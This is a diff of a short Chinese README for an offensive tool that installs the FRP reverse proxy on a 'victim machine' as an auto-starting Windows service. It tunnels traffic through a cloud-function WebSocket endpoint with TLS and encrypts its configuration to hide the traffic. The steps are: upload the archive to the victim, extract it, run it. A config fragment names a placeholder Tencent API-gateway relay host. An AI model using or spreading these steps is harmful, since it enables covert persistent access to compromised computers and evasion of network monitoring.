@@ -1,11 +1,12 @@
 # rfas
-让FRP以Windows服务运行
-
-FRP配置文件采用云函数+TLS加密
-如果不想做流量加密，将f3p.exe替换为正常的frp文件即可，配置文件同理
-
+FRP采用云函数+TLS加密，采用Websocket通信，配置文件也做了加密
 将压缩包上传到受害者机器，解压，运行
+这里注意的一点是run.xml是run.exe的配置文件，用来定义自启服务的配置，文件名要和配置文件名字统一
 zz是frp的配置文件
+如果不想做流量加密，将f3p.exe替换为正常的frp文件即可，配置文件同理
+尖括号<>里为参数说明，正式使用请删除
+
+zz
 ```
 [common]
 n2PvV = service-xxxxxx.xxxx.bj.apigw.tencentcs.com <wss服务地址>
